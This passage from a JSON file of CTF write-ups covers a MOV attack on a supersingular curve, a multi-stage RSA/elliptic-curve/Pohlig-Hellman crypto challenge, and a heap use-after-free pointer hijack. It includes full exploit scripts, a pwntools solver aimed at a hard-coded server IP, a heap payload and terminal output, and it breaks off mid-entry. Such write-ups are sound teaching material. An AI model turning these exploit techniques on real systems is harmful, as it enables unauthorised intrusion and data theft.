coprime exponents (e.g., e = 65537). Implement proper input validation to ensure gcd(e, φ(n)) = 1 before accepting RSA keys."
},
{
  "id": "16",
  "title": "Moving Supersingular",
  "category": "Crypto",
  "difficulty": "Hard",
  "points": 0,
  "date": "2025-02-26",
  "author": "CTF Team",
  "ctfName": "Flagyard CTF",
  "description": "Elliptic Curve Cryptography challenge exploiting supersingular curve via Tate pairing reduction and Index Calculus attack. Demonstrates why supersingular curves are forbidden in modern cryptography standards.",
  "problemDescription": "Server implements a flag encryption system using Elliptic Curve Cryptography with a supersingular curve over GF(p). Each 12-byte flag chunk is encrypted as Q = s⋅G where s is the secret scalar and Q is the transmitted point. Task: recover all scalar values s (solving the ECDLP) for each flag segment using the MOV Attack.",
  "tools": [
    "SageMath",
    "Pairing-Based Cryptography",
    "Tate Pairing",
    "MOV Attack",
    "Index Calculus",
    "Discrete Logarithm",
    "Python 3"
  ],
  "analysis": "The challenge exploits a critical weakness in supersingular elliptic curves related to embedding degree and pairing technology as described in the MOV (Menezes-Okamoto-Vanstone) attack from 1993.\n\n**Vulnerability Chain:**\n\n1. **Supersingular Curve Detection**: The hint \"i like to move it, move it\" directly references the MOV Attack name. The curve is supersingular with embedding degree k = 2.\n\n2. **Small Embedding Degree**: Supersingular curves have embedding degree k = 2 (for curves in characteristic > 3). This means ECDLP on a 96-bit curve can be reduced to DLP on a 192-bit extension field GF(p²), which is vastly easier to solve.\n\n3. **Weak Modulus**: The 96-bit modulus p is far too small. Even 192 bits post-reduction is vulnerable to Index Calculus attacks on finite fields.\n\n**The MOV Attack in Three Steps:**\n\n1. **Pairing Computation**: Apply the Tate pairing φ to convert ECDLP into a DLP problem. The pairing is bilinear: e(sG, P) = e(G, P)^s\n2. **Field Extension**: The pairing result lives in GF(p²) where DLP can be solved much faster. The field size is only 192 bits, making Index Calculus feasible.\n3. **Discrete Log Recovery**: Use .log() in SageMath (which applies Index Calculus internally) to recover the scalar s.",
  "mathAnalysis": [
    {
      "title": "Supersingular Curve Property",
      "formula": "E: y^2 = x^3 + ax + b \\pmod{p} \\text{ is supersingular if trace } t \\equiv 0 \\pmod{p}",
      "description": "Defining characteristic: the trace of Frobenius is zero modulo p"
    },
    {
      "title": "Embedding Degree Definition",
      "formula": "k \\text{ is the minimal positive integer such that } n \\mid (p^k - 1)\\\\nFor supersingular curves: k \\in \\{1, 2\\}",
      "description": "Supersingular curves have exceptionally small embedding degrees, making MOV attacks feasible"
    },
    {
      "title": "Tate Pairing Bilinearity",
      "formula": "e(sG, P) = e(G, P)^s \\\\ \\text{If } Q = sG: \\ e(Q, P) = u^s \\in \\mathbb{F}_{p^2}^*",
      "description": "The core property enabling ECDLP reduction to DLP in the extension field"
    }
  ],
  "solution": [
    {
      "title": "Step 1: Identify Curve Parameters",
      "content": "Extract the elliptic curve parameters (p, a, b) provided in the challenge. Verify the curve is supersingular using SageMath's .is_supersingular() method."
    },
    {
      "title": "Step 2: Setup Curve and Generator",
      "content": "Initialize the elliptic curve E over GF(p) with the given coefficients. Identify the generator point G and compute its order n.",
      "code": "E = EllipticCurve(GF(p), [a, b])\nG = E.gens()[0]\nn = G.order()"
    },
    {
      "title": "Step 3: Create Field Extension GF(p²)",
      "content": "Create the quadratic extension field GF(p²) where pairing results live. Extend the curve to E₂ over the extension field.",
      "code": "K2.<z> = GF(p^2)\nE2 = E.base_extend(K2)\nG2 = E2(G)"
    },
    {
      "title": "Step 4: Find Auxiliary Pairing Point",
      "content": "Select a random point P_aux on the extended curve E₂ such that the pairing e(G, P_aux) ≠ 1 and has order n.",
      "code": "while True:\n    P_aux = E2.random_point()\n    u = G2.tate_pairing(P_aux, n, 2)\n    if u != 1 and u^n == 1:\n        break"
    },
    {
      "title": "Step 5: MOV Attack - Convert ECDLP to DLP",
      "content": "For each challenge point Q, compute the Tate pairing v = e(Q, P_aux). The relationship v = u^s holds where u = e(G, P_aux). Solve for s using standard DLP.",
      "code": "def solve_dlp(Q_challenge):\n    Q_ext = E2(Q_challenge)\n    v = Q_ext.tate_pairing(P_aux, n, 2)\n    return v.log(u)"
    },
    {
      "title": "Step 6: Recover All Flag Segments",
      "content": "Apply the DLP solver to each challenge point. Convert each recovered scalar s_i to a 12-byte value and concatenate all segments to recover the flag. Complete solve script:",
      "code": "#!/usr/bin/env sage\n# MOV Attack on Supersingular Elliptic Curve\n# Challenge: Flagyard CTF - Moving Supersingular\n\n# Input parameters from challenge\np = 71323803796758910290373490389\na = 0\nb = 1\n\n# Step 1: Setup curve\nprint(\"[*] Setting up elliptic curve...\")\nE = EllipticCurve(GF(p), [a, b])\nprint(f\"[*] Apakah Supersingular? {E.is_supersingular()}\")\n\n# Get generator point\nG = E.gens()[0]\nn = G.order()\nprint(f\"[*] Order grup n: {n}\")\nprint(f\"[*] Karakteristik p: {p}\")\n\n# Step 2: Create extension field GF(p^2)\nprint(f\"[*] Setting up extension field GF(p^2)...\")\nK2.<z> = GF(p^2)\nE2 = E.base_extend(K2)\nG2 = E2(G)\n\n# Step 3: Find auxiliary point for pairing\nprint(f\"[*] Finding auxiliary point for pairing...\")\nwhile True:\n    P_aux = E2.random_point()\n    u = G2.tate_pairing(P_aux, n, 2)\n    if u != 1 and u^n == 1:\n        print(f\"[+] Pairing base 'u' found. Starting DLP...\")\n        break\n\n# Step 4: Define DLP solver\ndef solve_dlp(Q_challenge, description=\"\"):\n    Q_ext = E2(Q_challenge)\n    v = Q_ext.tate_pairing(P_aux, n, 2)\n    print(f\"[*] Solving for {description}...\")\n    s = v.log(u)\n    label = description.replace('Q', 's')\n    print(f\"[+] Found {label}: {s}\")\n    return s\n\n# Challenge points from problem\nQ1 = E(...)  # Challenge point 1\nQ2 = E(...)  # Challenge point 2\n\n# Step 5: Solve for all secret scalars\ns1 = solve_dlp(Q1, \"Q1\")\ns2 = solve_dlp(Q2, \"Q2\")\n\n# Step 6: Recover flag\nfrom Crypto.Util.number import long_to_bytes\nflag_bytes = long_to_bytes(int(s1)).rjust(12, b'\\x00') + long_to_bytes(int(s2)).rjust(12, b'\\x00')\nflag = flag_bytes.decode().strip()\nprint(f\"\\n[!] FLAG: {flag}\")"
    }
  ],
  "terminalOutputs": [
    {
      "command": "sage solve.sage",
      "output": "[*] Order grup n: 71323803796758910290373490390\n[*] Karakteristik p: 71323803796758910290373490389\n[*] Apakah Supersingular? True\n[*] Setting up extension field GF(p^2)...\n[*] Finding auxiliary point for pairing...\n[+] Pairing base 'u' found. Starting DLP...\n[*] Solving for Q1...\n[+] Found s1: 21794974652023851764645458515\n[*] Solving for Q2...\n[+] Found s2: 32629396274699578950030687489\n\n[!] FLAG: FlagY{SuperSingle_M0Vs}"
    }
  ],
  "flag": "FlagY{SuperSingle_M0Vs}",
  "lessonsLearned": "**Supersingular Curves Are Cryptographically Broken** - Supersingular curves must never be used for standard ECDLP-based encryption due to their small embedding degrees. The MOV Attack has been known since 1993 and reduces security dramatically. Use ordinary curves (non-supersingular) for any discrete logarithm-based cryptography.\n\n**Embedding Degree Determines Security** - The embedding degree k directly impacts ECDLP difficulty. For standard curves, k should be very large (effectively infinite). Supersingular curves have k ≤ 2, making them unsuitable for signature schemes or key agreement.\n\n**Pairing Technology is Double-Edged** - While pairings enable powerful cryptographic schemes (IBE, attribute-based encryption), they also enable attacks on weak curves. Modern pairing-friendly curves are specifically constructed to resist MOV and related attacks.\n\n**96-bit Modulus is Insufficient** - Even without pairing reduction, a 96-bit modulus is far too weak for cryptography. The resulting 192-bit DLP is easily solved by Index Calculus. Modern standards require minimum 256-bit keys.\n\n**Hint Analysis is Important** - The challenge hint \"i like to move it, move it\" directly pointed to the MOV Attack. CTF hints often contain cryptographic references worth investigating.\n\n**Index Calculus Threat** - Index Calculus breaks finite field DLP when the field size reaches practical limits (~192 bits). Always use cryptographically substantial field sizes.\n\n**Defense Strategy** - Use ordinary elliptic curves with large embedding degree. Implement proper parameter validation. Use standardized curves from NIST or RFC 5639 that have been vetted for security properties."
},
{
  "id": "17",
  "title": "MadMath",
  "category": "Crypto",
  "difficulty": "Hard",
  "points": 0,
  "date": "2026-03-20",
  "author": "CTF Team",
  "ctfName": "HackTheBox",
  "description": "Advanced cryptography challenge combining RSA key recovery, Elliptic Curve parameter reconstruction, and Oracle-assisted Pohlig-Hellman attack with optimized BSGS.",
  "problemDescription": "MadMath adalah tantangan kriptografi tingkat lanjut yang mensimulasikan protokol enkripsi khusus. Tantangan ini menguji pemahaman terhadap tiga lapis kerentanan: kelemahan pada RSA Key Generation, pemulihan parameter Elliptic Curve secara aljabar, dan eksploitasi Discrete Logarithm Problem (DLP) pada grup perkalian menggunakan kombinasi Oracle-assisted Pohlig-Hellman dan Baby-step Giant-step (BSGS).",
  "tools": [
    "SageMath",
    "pwntools",
    "Python",
    "Pohlig-Hellman Attack",
    "BSGS Algorithm",
    "ECM Factorization",
    "Chinese Remainder Theorem",
    "Elliptic Curve Cryptography"
  ],
  "analysis": "Sistem enkripsi pada MadMath memiliki celah di setiap tahapan pembuatannya. Berikut adalah bongkar pasang matematis dari skenario serangan ini:\n\nTahap 1: RSA Modulus Recovery via ECM\nServer memberikan nilai eksponen privat d dan ciphertext c, tetapi menyembunyikan modulus n. Berdasarkan standar RSA, hubungan antara e dan d didefinisikan sebagai: e·d ≡ 1 (mod φ(n)). Artinya, terdapat sebuah bilangan bulat k sedemikian rupa sehingga e·d - 1 = k·φ(n). Karena e = 65537 bernilai kecil, kita bisa mengiterasi nilai k dari 1 hingga e untuk mencari nilai pasti dari φ(n).\n\nDari source code, kita mengetahui konstruksi φ(n): φ(n) = (p-1)(q-1) = (a²·g)·(b²·g) = a²·b²·g². Bentuk a²·b²·g² memastikan bahwa φ(n) adalah sebuah bilangan kuadrat sempurna. Dengan menarik akar kuadratnya, kita mendapatkan sebuah nilai S: S = √φ(n) = a·b·g.\n\nKelemahan fatal terletak pada fungsi FactorWalker yang membatasi ukuran prima pembentuk a, b, dan g maksimal hanya 70-bit. Nilai S dapat dengan mudah difaktorkan menjadi prima-prima penyusunnya menggunakan algoritma Lenstra Elliptic Curve Factorization (ECM). Setelah faktor didapat, kita mendistribusikannya kembali untuk memulihkan nilai p dan q, menghitung n = p·q, lalu mendekripsi passphrase serta AES Key.\n\nTahap 2: Elliptic Curve Parameter Recovery\nDengan AES Key di tangan, kita bisa mendekripsi output heksadesimal dari Oracle untuk mendapatkan titik koordinat P = (x, y). Namun, parameter kurva tersebut disembunyikan. Sebuah kurva eliptik pada medan berhingga didefinisikan oleh persamaan Weierstrass: y² ≡ x³ + ax + b (mod p).\n\nDengan melakukan query ke Oracle menggunakan eksponen 2, 3, dan 4, kita memperoleh tiga titik valid: P₂(x₂, y₂), P₃(x₃, y₃), dan P₄(x₄, y₄). Dengan mengurangkan persamaan-persamaan tersebut, kita dapat mengeliminasi parameter a dan b, menyisakan persamaan di mana selisihnya adalah kelipatan dari modulus p.\n\nNilai modulus kurva p didapatkan dengan menghitung Greatest Common Divisor (GCD) dari kombinasi titik-titik tersebut. Selanjutnya, parameter a dan b dapat dicari secara aljabar murni.\n\nTahap 3: The Multiplicative Group DLP\nSkenario ini memiliki sebuah jebakan (rabbit hole). Kurva yang digunakan memiliki orde grup N di mana N adalah bilangan prima 256-bit yang kokoh, sehingga serangan ECDLP murni tidak mungkin dilakukan.\n\nNamun, perhatikan bagaimana Oracle menghitung titik enkripsinya: P_enc = (FLAG^exp mod g_order)·G. Celah sesungguhnya bukanlah memecahkan logaritma diskrit pada titik kurva eliptik, melainkan DLP pada grup perkalian modulo g_order. Kita ingin mencari skalar s sedemikian rupa sehingga s·G = P_enc.\n\nKarena skalar operasi ini dieksekusi modulo g_order, masalah logaritma diskrit berada pada ruang grup Z_g_order¹. Jika kita memfaktorkan g_order - 1, nilainya ternyata sangat smooth dengan faktor primanya kecil-kecil (terbesar ≈ 4 × 10⁸). Kondisi ini sangat rentan terhadap serangan Pohlig-Hellman.\n\nUntuk mempercepat komputasi pada faktor prima terbesar, pencarian linear O(q) harus ditingkatkan menggunakan optimasi Baby-step Giant-step (BSGS), yang memangkas kompleksitas waktu menjadi O(√q). Operasi yang tadinya membutuhkan ≈ 400.000.000 iterasi berkurang drastis menjadi hanya ≈ 20.000 iterasi. Terakhir, sisa-sisa perhitungan disatukan menggunakan Chinese Remainder Theorem (CRT) untuk mengekstrak FLAG secara utuh.",
  "mathAnalysis": [
    {
      "title": "RSA Key Relationship",
      "formula": "e \\cdot d - 1 = k \\cdot \\phi(n), \\quad \\text{where } e = 65537",
      "description": "Finding φ(n) by iterating k from 1 to e",
      "variant": "highlight"
    },
    {
      "title": "Perfect Square Structure",
      "formula": "\\phi(n) = a^2 \\cdot b^2 \\cdot g^2 \\implies S = \\sqrt{\\phi(n)} = a \\cdot b \\cdot g",
      "description": "The construct ensures φ(n) is a perfect square",
      "variant": "default"
    },
    {
      "title": "Elliptic Curve Equation",
      "formula": "y^2 \\equiv x^3 + ax + b \\pmod{p}",
      "description": "Weierstrass form for arbitrary point recovery",
      "variant": "default"
    },
    {
      "title": "Parameter Elimination",
      "formula": "N_1 \\cdot D_2 - N_2 \\cdot D_1 \\equiv 0 \\pmod{p}",
      "description": "GCD of point differences yields the modulus p",
      "variant": "default"
    },
    {
      "title": "Pohlig-Hellman Complexity",
      "formula": "\\text{If } g\\_order - 1 = \\prod p_i^{e_i}, \\text{ then } O(\\sqrt{p_{max}}) \\text{ via BSGS}",
      "description": "Reduce linear search to square-root time with Baby-step Giant-step",
      "variant": "highlight"
    }
  ],
  "solution": [
    {
      "title": "Stage 1: Recover φ(n) and Factor S",
      "content": "Connect to server and retrieve d and c. Iterate k from 1 to e=65537 to find φ(n) = (e·d - 1) / k. Take square root to get S, then use ECM factorization to recover prime factors a, b, g. Reconstruct p = a²·g + 1 and q = b²·g + 1, compute n = p·q, then decrypt passphrase and AES key."
    },
    {
      "title": "Stage 2: Recover Elliptic Curve Parameters",
      "content": "Query Oracle with exponents 2, 3, 4 to get three points on the curve. Decrypt using AES-ECB with recovered key. Extract coordinates and use algebraic elimination (GCD technique) to find curve modulus p. Then solve for parameters a and b using the Weierstrass equation."
    },
    {
      "title": "Stage 3: Setup Pohlig-Hellman Attack",
      "content": "Compute the order of the elliptic curve. Find a primitive root of the multiplicative group. Factor g_order - 1 to identify all prime power factors. The largest factor is approximately 4×10⁸, requiring optimization."
    },
    {
      "title": "Stage 4: Apply BSGS Optimization",
      "content": "For each prime power factor q^e, use lifting-the-exponent technique combined with Baby-step Giant-step algorithm. Instead of O(q) linear search, achieve O(√q) complexity. Build hashtable of baby steps, then perform giant steps to locate matches.",
      "code": "m = isqrt(q) + 1\nbaby_steps = {}\n# Baby step phase\ncurr_P = P_base\nfor v in range(m):\n    baby_steps[curr_P] = v\n    curr_P = B_scalar * curr_P\n\n# Giant step phase\nB_inv_m = pow(B_inv, m, g_order)\ncurr_Q = P_target\nfor u in range(m):\n    if curr_Q in baby_steps:\n        v = baby_steps[curr_Q]\n        j = u * m + v\n        return j\n    curr_Q = B_inv_m * curr_Q"
    },
    {
      "title": "Stage 5: Combine Results with CRT",
      "content": "After solving DLP for each prime power factor, use Chinese Remainder Theorem to combine the congruences x ≡ x_i (mod q_i^e_i) into a single solution x modulo the full g_order.",
      "code": "x_congruences = [x_mod_q1, x_mod_q2, ...]\nmoduli = [q1^e1, q2^e2, ...]\nx = crt(x_congruences, moduli)"
    },
    {
      "title": "Complete Exploit Script",
      "content": "Full working solver combining all stages with optimizations:",
      "code": "from pwn import *\nfrom Crypto.Util.number import *\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import unpad\nimport hashlib\nfrom collections import Counter\n\ncontext.log_level = 'error'\n\ndef solve():\n    print(\"[*] Menghubungkan ke server...\")\n    io = remote(\"154.57.164.74\", 32526)\n\n    # 1. Parsing d dan c\n    io.recvuntil(b\"d = \")\n    d = int(io.recvline().strip())\n    io.recvuntil(b\"c = \")\n    c = int(io.recvline().strip())\n    print(\"[+] Berhasil mendapatkan parameter d dan c dari server.\")\n\n    # 2. Mencari phi(n)\n    print(\"[*] Tahap 1: Mencari phi(n)...\")\n    e = 65537\n    ed_minus_1 = e * d - 1\n    phi = None\n    for k in range(1, e + 1):\n        if ed_minus_1 % k == 0:\n            p_cand = ed_minus_1 // k\n            if isqrt(p_cand)**2 == p_cand:\n                phi = p_cand\n                break\n\n    # 3. Faktorisasi S menggunakan ECM\n    S = isqrt(phi)\n    print(\"[*] Memfaktorkan S dengan ECM...\")\n    factors = ecm.factor(S)\n    print(f\"[+] Faktor ditemukan: {factors}\")\n\n    # 4. Pencarian a, b, g\n    def solve_abg(factors_list):\n        counts = Counter(factors_list)\n        unique_factors = list(counts.keys())\n\n        def search(idx, a, b, g):\n            if idx == len(unique_factors):\n                p_test = a**2 * g + 1\n                q_test = b**2 * g + 1\n                if is_prime(p_test) and is_prime(q_test):\n                    return a, b, g\n                return None\n            p_factor = unique_factors[idx]\n            max_count = counts[p_factor]\n            for i in range(max_count + 1):\n                for j in range(max_count + 1 - i):\n                    if i > 0 and j > 0: continue\n                    k = max_count - i - j\n                    res = search(idx + 1, a * (p_factor**i), b * (p_factor**j), g * (p_factor**k))\n                    if res: return res\n            return None\n        return search(0, 1, 1, 1)\n\n    res = solve_abg(factors)\n    a, b, g_val = res\n    p = a**2 * g_val + 1\n    q = b**2 * g_val + 1\n    n = p * q\n\n    # 5. Ekstrak Passphrase & AES Key\n    m = pow(c, int(d), int(n))\n    PASSPHRASE = long_to_bytes(int(m)).decode()\n    print(f\"[+] PASSPHRASE: {PASSPHRASE}\")\n    KEY = hashlib.sha256(PASSPHRASE.encode()).digest()\n\n    # 6. Tahap 2: Oracle Elliptic Curve\n    print(\"\\n[*] Tahap 2: Berinteraksi dengan Oracle...\")\n    def get_point(exp):\n        io.sendlineafter(b\"Give me an exponent: \", str(exp).encode())\n        enc_hex = io.recvline().strip().decode()\n        cipher = AES.new(KEY, AES.MODE_ECB)\n        dec = unpad(cipher.decrypt(bytes.fromhex(enc_hex)), 16).decode()\n        dec = dec.strip(\"()\")\n        x_str, y_str = dec.split(\",\")\n        return int(x_str), int(y_str)\n\n    X2, Y2 = get_point(2)\n    X3, Y3 = get_point(3)\n    X4, Y4 = get_point(4)\n\n    Gx, Gy = 40733212845287381659537354559134076551920727536123123802035255333770142251507, 5939195932044123182011708420242714254691399994280021264443261849355562421816\n\n    # 7. Memulihkan Parameter Kurva\n    N1 = Gy**2 - Y2**2 - (Gx**3 - X2**3)\n    D1 = Gx - X2\n    N2 = Y2**2 - Y3**2 - (X2**3 - X3**3)\n    D2 = X2 - X3\n    K1 = N1 * D2 - N2 * D1\n\n    N3 = Y3**2 - Y4**2 - (X3**3 - X4**3)\n    D3 = X3 - X4\n    K2 = N2 * D3 - N3 * D2\n\n    curve_p = gcd(K1, K2)\n    print(f\"[+] curve_p ditemukan: {curve_p}\")\n\n    curve_a = ((Gy**2 - Y2**2 - (Gx**3 - X2**3)) * inverse_mod(Gx - X2, curve_p)) % curve_p\n    curve_b = (Gy**2 - Gx**3 - curve_a * Gx) % curve_p\n\n    E = EllipticCurve(GF(curve_p), [curve_a, curve_b])\n    G = E(Gx, Gy)\n    g_order = E.order()\n\n    # 8. Pohlig-Hellman with BSGS\n    print(\"\\n[*] Tahap 3: Menjalankan Pohlig-Hellman (BSGS Optimized)...\")\n    print(\"[*] Memfaktorkan (g_order - 1)...\")\n    factors_g = factor(g_order - 1)\n    print(f\"[+] g_order - 1 = {factors_g}\")\n\n    # Primitive root\n    g_prim = None\n    for cand in primes(2, 100):\n        is_primitive = True\n        for q, _ in factors_g:\n            if pow(cand, (g_order - 1) // q, g_order) == 1:\n                is_primitive = False\n                break\n        if is_primitive:\n            g_prim = cand\n            break\n\n    x_congruences = []\n    moduli = []\n\n    for q, e in factors_g:\n        print(f\"[*] Solving for {q}^{e}...\")\n        q_power = q**e\n        known_x = 0\n\n        for i in range(e):\n            exp_query = (g_order - 1) // (q**(i + 1))\n            io.sendlineafter(b\"Give me an exponent: \", str(exp_query).encode())\n            enc_hex = io.recvline().strip().decode()\n            cipher = AES.new(KEY, AES.MODE_ECB)\n            dec = unpad(cipher.decrypt(bytes.fromhex(enc_hex)), 16).decode()\n            dec = dec.strip(\"()\")\n            x_str, y_str = dec.split(\",\")\n            P_target = E(int(x_str), int(y_str))\n\n            step = (g_order - 1) // q\n            A_scalar = pow(int(g_prim), int(known_x * exp_query), int(g_order))\n            B_scalar = pow(int(g_prim), int(step), int(g_order))\n\n            P_base = int(A_scalar) * G\n            m = int(isqrt(q)) + 1\n            baby_steps = {}\n\n            curr_P = P_base\n            for v in range(m):\n                baby_steps[curr_P] = v\n                curr_P = int(B_scalar) * curr_P\n\n            B_inv = inverse_mod(int(B_scalar), int(g_order))\n            B_inv_m = pow(int(B_inv), m, int(g_order))\n            curr_Q = P_target\n\n            for u in range(m):\n                if curr_Q in baby_steps:\n                    v = baby_steps[curr_Q]\n                    j = u * m + v\n                    known_x += j * (q**i)\n                    break\n                curr_Q = int(B_inv_m) * curr_Q\n\n        x_congruences.append(known_x)\n        moduli.append(q_power)\n        print(f\"    [+] x ≡ {known_x} (mod {q_power})\")\n\n    # 9. CRT\n    print(\"\\n[*] Menjahit hasil dengan CRT...\")\n    x = crt(x_congruences, moduli)\n    FLAG_int = pow(int(g_prim), int(x), int(g_order))\n\n    print(\"\\n[🎉] FLAG:\")\n    print(long_to_bytes(int(FLAG_int)).decode())\n\n    io.close()\n\nif __name__ == \"__main__\":\n    solve()"
    }
  ],
  "terminalOutputs": [
    {
      "command": "sage solve.sage",
      "output": "[*] Menghubungkan ke server...\n[+] Berhasil mendapatkan parameter d dan c dari server.\n[*] Tahap 1: Mencari phi(n)...\n[*] Memfaktorkan S dengan ECM (tunggu beberapa detik)...\n[+] Faktor ditemukan: [2, 3, 86928912623171, 213787377563519821, 217782665365747543, 655446963345076210631, 662765709558331559309, 861237803832676067153, 949714727183321757223, 1331640498435948271387]\n[+] PASSPHRASE: Korea <3 Discrete Logarithm Problems\n\n[*] Tahap 2: Berinteraksi dengan Oracle Elliptic Curve...\n[+] curve_p ditemukan: 60848817910369111880334871105011015293762638801805685625660812011580778435781\n\n[*] Tahap 3: Menjalankan Oracle-assisted Pohlig-Hellman (Optimized BSGS)...\n[*] Memfaktorkan (g_order - 1)... (harap tunggu sebentar)\n[+] g_order - 1 = 2^2 * 7^4 * 29 * 47 * 4909 * 6991^2 * 21821 * 101411^2 * 766079 * 1325227 * 3686341 * 138827527 * 407639629^2\n[*] Mencari primitive root...\n[+] Primitive root g = 2\n\n[*] Memulai pencarian logaritma diskrit via BSGS (Sangat Cepat!)...\n[*] Menyelesaikan untuk sub-grup dengan faktor 2^2 ...\n    [+] Didapat x = 1 mod 4\n[*] Menyelesaikan untuk sub-grup dengan faktor 7^4 ...\n    [+] Didapat x = 1312 mod 2401\n[*] Menyelesaikan untuk sub-grup dengan faktor 29^1 ...\n    [+] Didapat x = 9 mod 29\n[*] Menyelesaikan untuk sub-grup dengan faktor 47^1 ...\n    [+] Didapat x = 21 mod 47\n[*] Menyelesaikan untuk sub-grup dengan faktor 4909^1 ...\n    [+] Didapat x = 3093 mod 4909\n[*] Menyelesaikan untuk sub-grup dengan faktor 6991^2 ...\n    [+] Didapat x = 44439674 mod 48874081\n[*] Menyelesaikan untuk sub-grup dengan faktor 21821^1 ...\n    [+] Didapat x = 605 mod 21821\n[*] Menyelesaikan untuk sub-grup dengan faktor 101411^2 ...\n    [+] Didapat x = 249977060 mod 10284190921\n[*] Menyelesaikan untuk sub-grup dengan faktor 766079^1 ...\n    [+] Didapat x = 751636 mod 766079\n[*] Menyelesaikan untuk sub-grup dengan faktor 1325227^1 ...\n    [+] Didapat x = 934634 mod 1325227\n[*] Menyelesaikan untuk sub-grup dengan faktor 3686341^1 ...\n    [+] Didapat x = 1363781 mod 3686341\n[*] Menyelesaikan untuk su-grup dengan faktor 138827527^1 ...\n    [+] Didapat x = 78893824 mod 138827527\n[*] Menyelesaikan untuk sub-grup dengan faktor 407639629^2 ...\n    [+] Didapat x = 14046441229636986 mod 166170067131257641\n\n[*] Menjahit potongan hasil dengan Chinese Remainder Theorem (CRT)...\n[+] Logaritma dari FLAG ditemukan: x = 23167429319002833280458444367972413240595227877404475285248913846196893299221\nFLAG BERHASIL DIDAPATKAN:\nHTB{m4th_m4st3r_0r_pur3_g3niu5?}"
    }
  ],
  "flag": "HTB{m4th_m4st3r_0r_pur3_g3niu5?}",
  "lessonsLearned": "**RSA Parameter Generation** - Custom RSA implementations must never use weak key generation. Ensuring p and q have specific algebraic structures (like a²g+1) creates exploitable patterns. Always use FIPS-approved key generation.\n\n**Small Prime Factors Enable Factorization** - ECM (Elliptic Curve Method) efficiently factors numbers with small prime factors. The 70-bit limit on factors makes complete factorization feasible. Always use cryptographically strong prime generation (no artificial constraints).\n\n**Curve Parameter Confidentiality** - Elliptic curve parameters (a, b, p) should not be recoverable from point samples. The algebraic elimination technique demonstrates how three carefully chosen points can leak the entire curve structure.\n\n**Smooth Orders Are Security Disasters** - A smooth g_order (where g_order - 1 has only small prime factors) is vulnerable to Pohlig-Hellman decomposition. Always verify that the group order has at least one prime factor with significant size (>2^100).\n\n**Oracle Queries Leak Information** - Providing oracle access to encryption under multiple exponents is dangerous. Each query potentially extracts cryptographic material. Minimize oracle interactions and randomize responses.\n\n**BSGS is Essential for Medium Primes** - When the group structure is decomposed to medium-sized prime powers (~10⁸), naive linear search becomes infeasible. Baby-step Giant-step reduces O(q) to O(√q), making what seemed impossible become practical.\n\n**Chinese Remainder Theorem Unifies Solutions** - CRT elegantly combines partial solutions from each prime power factor into the final answer. Understanding modular arithmetic at this level is critical for advanced cryptanalysis.\n\n**Layered Vulnerabilities Compound** - MadMath is hard not because any single vulnerability is extreme, but because three moderate vulnerabilities chain together. Security depends on every layer being strong."
},
{
  "id": "18",
  "title": "RogueCart",
  "category": "Pwn",
  "difficulty": "Medium",
  "points": 0,
  "date": "2026-03-15",
  "author": "CTF Team",
  "ctfName": "JerseyCTF",
  "description": "Heap exploitation challenge involving use-after-free vulnerability and pointer hijacking to leak flag from protected memory region.",
  "problemDescription": "A rescue shuttle has drifted off-course, and its onboard maintenance systems are behaving strangely. The control interface still responds, but corrupted diagnostics suggest the distress relay is pointing somewhere it shouldn't. You've gained access to the shuttle's recovery console. Analyze the binary, manipulate the maintenance systems, and recover whatever message is buried in the wreckage before the link dies.",
  "tools": [
    "checksec",
    "file",
    "strings",
    "nm",
    "objdump",
    "pwntools",
    "gdb"
  ],
  "analysis": "RogueCart is a binary exploitation challenge involving 3 interconnected vulnerabilities:\n\n1. **Use-After-Free (UAF)**: The servicePanel() function frees the serviceShuttle object but fails to null the global pointer, leaving a dangling pointer that remains accessible.\n\n2. **Type/State Confusion via Reallocation**: The memory chunk freed from serviceShuttle is reused by maintenanceBlob because both have identical size (0x40) and tcache uses LIFO. Attacker input can overwrite fields of the old object.\n\n3. **Trusted Pointer Dereference**: The puts(serviceShuttle->relay) function uses a pointer that has been overwritten by the attacker without any validation.\n\n4. **Information Leak**: The program outputs the heap address of serviceShuttle at startup via [ SHUTTLE HANDLE: 0x... ], allowing the attacker to calculate the exact offset to vaultChunk where the flag is stored.",
  "solution": [
    {
      "title": "Step 1: Enumerate Binary Properties",
      "content": "Use checksec and file to understand the binary's protections and architecture. The binary is a 64-bit ELF, dynamically linked without PIE, but with Stack Canary and NX enabled."
    },
    {
      "title": "Step 2: Observe Program Behavior",
      "content": "Run the binary and identify the interactive menu. The program displays a heap pointer leak at startup ([ SHUTTLE HANDLE: 0x... ]) which is the address of the serviceShuttle object.",
      "code": "1. Jettison shuttle\n2. Load maintenance blob\n3. Broadcast distress relay\n4. Exit"
    },
    {
      "title": "Step 3: Map Heap Layout",
      "content": "Analyze the primeShuttle() function to understand the allocation order. All allocations have size 0x40 bytes, meaning the glibc chunk stride is 0x50. The vaultChunk (containing the flag) is allocated 3 chunks before serviceShuttle.",
      "code": "Allocation order:\nvaultChunk (0x40) - heap offset 0x00\nspacerA (0x40) - heap offset 0x50\nspacerB (0x40) - heap offset 0xA0\nserviceShuttle (0x40) - heap offset 0xF0\nserviceShuttle->relay (0x40) - heap offset 0x140\n\nOffset formula:\nvaultChunk = shuttle_handle - 3*0x50 = shuttle_handle - 0xF0"
    },
    {
      "title": "Step 4: Analyze Vulnerability Chain",
      "content": "Menu option 1 calls free(serviceShuttle) but fails to null the global pointer. Menu option 2 performs malloc(0x40) for maintenanceBlob which will reuse the same chunk (tcache LIFO). The attacker's input can overwrite the pointer field at offset 0x20 (relay pointer)."
    },
    {
      "title": "Step 5: Craft Exploitation Payload",
      "content": "The payload must be 64 bytes with a pointer hijack at offset 0x20. This pointer is overwritten with vaultChunk's address so that puts(serviceShuttle->relay) prints the flag contents.",
      "code": "payload = b'A' * 0x20 + p64(vaultChunk)\npayload = payload.ljust(0x40, b'B')\n\nNote: Little-endian byte order matters for 64-bit pointers"
    },
    {
      "title": "Step 6: Execute Attack",
      "content": "Execution sequence:\n1. Read the leaked pointer from initial output\n2. Calculate vaultChunk = shuttle_handle - 0xF0\n3. Send menu option 1 (free serviceShuttle)\n4. Send menu option 2 with payload containing the pointer hijack\n5. Send menu option 3 to print distress relay (now pointing to vaultChunk with the flag)"
    },
    {
      "title": "Complete Exploit Script",
      "content": "Full working solver combining all stages:",
